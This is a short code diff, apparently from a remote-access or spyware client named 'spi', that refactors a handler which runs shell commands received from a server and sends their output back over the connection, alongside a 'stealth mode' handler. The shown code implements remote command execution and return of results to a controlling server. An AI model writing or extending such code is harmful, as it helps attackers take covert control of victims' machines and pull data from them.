@@ -52,16 +52,16 @@ namespace spi
 
             _log(logging::Debug) << "Executing shell command '" << rsh.cmd << "'" << std::endl;
             auto result = _viral.runShell(rsh.cmd);
-            proto::RawData rd;
 
+            proto::RawData rd;
             rd.bytes.insert(rd.bytes.end(), result.begin(), result.end());
             Buffer buff;
-            buff.clear();
-            rd.serialize(buff);
+            rd >> buff;
 
             ErrorCode ec;
             _conn.writeSome(net::BufferView(buff.data(), buff.size()), ec);
-            _log(logging::Debug) << "Result of command sent to server" << std::endl;
+            if (!ec)
+                _log(logging::Debug) << "Result of command sent to server" << std::endl;
         }
 
         void __handleStealthMode([[maybe_unused]] const ILoggable &s)
@@ -76,7 +76,6 @@ namespace spi
             _viral.show();
         }
 
-        Buffer _buff;
         Viral &_viral;
     };
 }
